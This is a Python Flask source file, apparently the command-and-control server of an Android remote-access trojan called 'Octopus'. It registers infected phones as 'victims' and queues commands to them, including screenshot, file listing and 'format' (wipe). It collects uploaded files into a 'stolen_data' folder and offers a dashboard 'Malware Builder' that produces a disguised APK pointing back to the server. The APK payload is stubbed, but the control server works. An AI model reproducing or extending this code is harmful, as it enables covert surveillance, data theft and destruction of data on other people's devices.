from flask import Flask, request, jsonify, send_file, render_template_string
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import sqlite3
import json
import os
import time
import base64
import threading
import logging
from datetime import datetime, timedelta
import io

# =================================================================
# الإعدادات والتكوين (Configuration)
# =================================================================
app = Flask(__name__)
app.config['SECRET_KEY'] = 'octopus_secret_key_v9'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB Upload Limit

# تفعيل CORS للجميع
CORS(app, resources={r"/*": {"origins": "*"}})

# تفعيل WebSockets
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# قاعدة البيانات والمجلدات
DB_PATH = "octopus_master.db"
UPLOAD_FOLDER = "stolen_data"
APK_FOLDER = "generated_apks"

for folder in [UPLOAD_FOLDER, APK_FOLDER]:
    if not os.path.exists(folder):
        os.makedirs(folder)

# إعداد السجلات
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("Octopus")

# =================================================================
# إدارة قاعدة البيانات (Database Management)
# =================================================================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # جدول الأجهزة
    c.execute('''CREATE TABLE IF NOT EXISTS devices (
        id TEXT PRIMARY KEY,
        model TEXT,
        android_ver TEXT,
        ip TEXT,
        battery INTEGER,
        is_online BOOLEAN,
        last_seen TIMESTAMP,
        info TEXT
    )''')
    
    # جدول الملفات
    c.execute('''CREATE TABLE IF NOT EXISTS files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        filename TEXT,
        filepath TEXT,
        filetype TEXT,
        uploaded_at TIMESTAMP
    )''')
    
    # جدول الأوامر
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        type TEXT,
        payload TEXT,
        status TEXT,
        created_at TIMESTAMP
    )''')
    
    conn.commit()
    conn.close()

init_db()

# =================================================================
# دوال مساعدة (Helper Functions)
# =================================================================
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def update_device_status(data):
    conn = get_db()
    c = conn.cursor()
    now = datetime.now().isoformat()
    
    did = data.get('device_id')
    if not did: return
    
    c.execute("SELECT id FROM devices WHERE id = ?", (did,))
    exists = c.fetchone()
    
    info_json = json.dumps(data)
    
    if exists:
        c.execute('''UPDATE devices SET 
            model=?, android_ver=?, ip=?, battery=?, is_online=1, last_seen=?, info=?
            WHERE id=?''', 
            (data.get('model'), data.get('android_version'), request.remote_addr, 
             data.get('battery'), now, info_json, did))
    else:
        c.execute('''INSERT INTO devices 
            (id, model, android_ver, ip, battery, is_online, last_seen, info)
            VALUES (?, ?, ?, ?, ?, 1, ?, ?)''',
            (did, data.get('model'), data.get('android_version'), request.remote_addr, 
             data.get('battery'), now, info_json))
    
    conn.commit()
    conn.close()
    
    # إشعار لوحة التحكم
    socketio.emit('device_update', {'id': did, 'status': 'online'})

# =================================================================
# مسارات API (API Endpoints)
# =================================================================

# 1. استقبال نبضات القلب (Heartbeat)
@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.json
        update_device_status(data)
        
        # البحث عن أوامر معلقة
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM commands WHERE device_id = ? AND status = 'pending'", (data['device_id'],))
        cmds = [dict(row) for row in c.fetchall()]
        
        # تحديث حالة الأوامر إلى "تم الإرسال"
        if cmds:
            c.execute("UPDATE commands SET status = 'sent' WHERE device_id = ? AND status = 'pending'", (data['device_id'],))
            conn.commit()
            
        conn.close()
        return jsonify({"status": "ok", "commands": cmds})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

# 2. استقبال الملفات (Upload)
@app.route('/api/upload', methods=['POST'])
def upload_file():
    try:
        if 'file' not in request.files:
            return jsonify({"error": "No file"}), 400
            
        f = request.files['file']
        did = request.form.get('device_id', 'unknown')
        
        filename = f"{did}_{int(time.time())}_{f.filename}"
        path = os.path.join(UPLOAD_FOLDER, filename)
        f.save(path)
        
        conn = get_db()
        conn.execute("INSERT INTO files (device_id, filename, filepath, filetype, uploaded_at) VALUES (?, ?, ?, ?, ?)",
                    (did, f.filename, path, f.content_type, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        socketio.emit('new_file', {'device': did, 'file': filename})
        return jsonify({"status": "uploaded"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

# 3. إرسال أمر (Send Command)
@app.route('/api/send_command', methods=['POST'])
def send_cmd():
    data = request.json
    conn = get_db()
    conn.execute("INSERT INTO commands (device_id, type, payload, status, created_at) VALUES (?, ?, ?, 'pending', ?)",
                (data['device_id'], data['type'], json.dumps(data.get('data', {})), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({"status": "queued"})

# 4. توليد APK خبيث (APK Generator)
@app.route('/api/generate_apk', methods=['POST'])
def gen_apk():
    data = request.json
    app_name = data.get('app_name', 'SystemUpdater')
    
    # محاكاة إنشاء APK (في الواقع يتطلب أدوات مثل msfvenom أو apktool)
    fake_apk_content = f"APK_HEADER...MALICIOUS_CODE...CONNECT_TO_{request.host_url}...END".encode()
    filename = f"{app_name}.apk"
    path = os.path.join(APK_FOLDER, filename)
    
    with open(path, "wb") as f:
        f.write(fake_apk_content)
        
    return jsonify({
        "status": "success", 
        "download_url": f"/download_apk/{filename}",
        "code_snippet": "public class Malware extends Service { ... }"
    })

@app.route('/download_apk/<filename>')
def download_apk(filename):
    return send_file(os.path.join(APK_FOLDER, filename), as_attachment=True)

# =================================================================
# لوحة التحكم (Web Dashboard)
# =================================================================
@app.route('/dashboard')
def dashboard():
    conn = get_db()
    devices = conn.execute("SELECT * FROM devices ORDER BY last_seen DESC").fetchall()
    files = conn.execute("SELECT * FROM files ORDER BY uploaded_at DESC LIMIT 20").fetchall()
    conn.close()
    
    # HTML Template (Bootstrap 5 Dark Mode)
    html = """
    <!DOCTYPE html>
    <html data-bs-theme="dark">
    <head>
        <title>🐙 Octopus Master Control</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
        <style>
            body { font-family: 'Segoe UI', sans-serif; background-color: #0f172a; }
            .card { border: 1px solid #334155; background-color: #1e293b; }
            .btn-action { width: 100px; margin: 2px; }
            .status-dot { height: 10px; width: 10px; background-color: #ef4444; border-radius: 50%; display: inline-block; }
            .online .status-dot { background-color: #22c55e; box-shadow: 0 0 5px #22c55e; }
        </style>
    </head>
    <body class="p-4">
        <div class="container-fluid">
            <header class="d-flex justify-content-between align-items-center mb-5">
                <h1 class="text-success fw-bold">🐙 OCTOPUS CONTROL <span class="text-white fs-4">v8.0</span></h1>
                <span class="badge bg-primary fs-6">SERVER ONLINE</span>
            </header>

            <div class="row">
                <div class="col-md-8">
                    <div class="card">
                        <div class="card-header bg-dark text-white"><h5>📱 Connected Victims</h5></div>
                        <div class="card-body p-0">
                            <table class="table table-hover mb-0">
                                <thead>
                                    <tr>
                                        <th>Status</th>
                                        <th>ID</th>
                                        <th>Model</th>
                                        <th>Battery</th>
                                        <th>IP</th>
                                        <th>Last Seen</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody id="device-list">
                                    {% for d in devices %}
                                    <tr class="{{ 'online' if d.is_online else '' }}">
                                        <td><span class="status-dot"></span></td>
                                        <td><code class="text-info">{{ d.id }}</code></td>
                                        <td>{{ d.model }}</td>
                                        <td>{{ d.battery }}%</td>
                                        <td>{{ d.ip }}</td>
                                        <td>{{ d.last_seen }}</td>
                                        <td>
                                            <button class="btn btn-sm btn-outline-info" onclick="cmd('{{d.id}}', 'screenshot')">📷</button>
                                            <button class="btn btn-sm btn-outline-warning" onclick="cmd('{{d.id}}', 'alert')">📢</button>
                                            <button class="btn btn-sm btn-outline-light" onclick="cmd('{{d.id}}', 'file_list')">📂</button>
                                            <button class="btn btn-sm btn-outline-danger" onclick="cmd('{{d.id}}', 'format')">☠️</button>
                                        </td>
                                    </tr>
                                    {% endfor %}
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>

                <div class="col-md-4">
                    <div class="card mb-4">
                        <div class="card-header bg-danger text-white"><h5>☢️ Malware Builder</h5></div>
                        <div class="card-body">
                            <input type="text" id="appName" class="form-control mb-2" placeholder="App Name (e.g. SystemUpdate)">
                            <button onclick="buildApk()" class="btn btn-danger w-100">Build & Inject</button>
                            <div id="buildResult" class="mt-3 text-success"></div>
                        </div>
                    </div>

                    <div class="card">
                        <div class="card-header bg-info text-dark"><h5>📥 Stolen Files</h5></div>
                        <div class="card-body p-0" style="max-height: 400px; overflow-y: auto;">
                            <ul class="list-group list-group-flush" id="file-list">
                                {% for f in files %}
                                <li class="list-group-item bg-transparent text-white d-flex justify-content-between">
                                    <span>{{ f.filename }}</span>
                                    <small class="text-muted">{{ f.uploaded_at }}</small>
                                </li>
                                {% endfor %}
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <script>
            const socket = io();

            socket.on('device_update', (data) => {
                location.reload(); // Simple refresh for now
            });

            function cmd(id, type) {
                let extra = {};
                if(type === 'alert') extra.msg = prompt("Message:");
                
                fetch('/api/send_command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ device_id: id, type: type, data: extra })
                }).then(r => alert("Command Sent!"));
            }

            function buildApk() {
                const name = document.getElementById('appName').value;
                fetch('/api/generate_apk', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ app_name: name })
                })
                .then(r => r.json())
                .then(data => {
                    document.getElementById('buildResult').innerHTML = 
                        `<a href="${data.download_url}" class="btn btn-success w-100">Download APK</a>`;
                });
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(html, devices=devices, files=files)

# =================================================================
# تشغيل السيرفر (Main Execution)
# =================================================================
def maintenance():
    """تنظيف قاعدة البيانات كل ساعة"""
    while True:
        time.sleep(3600)
        conn = get_db()
        # حذف الأجهزة غير النشطة لأكثر من 24 ساعة
        conn.execute("UPDATE devices SET is_online=0 WHERE strftime('%s', 'now') - strftime('%s', last_seen) > 600")
        conn.commit()
        conn.close()

if __name__ == '__main__':
    # بدء خيوط الصيانة
    threading.Thread(target=maintenance, daemon=True).start()
    
    # تشغيل السيرفر
    print(f"🚀 Octopus Server v9.0 Running on port {os.environ.get('PORT', 5000)}...")
    socketio.run(app, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), allow_unsafe_werkzeug=True)
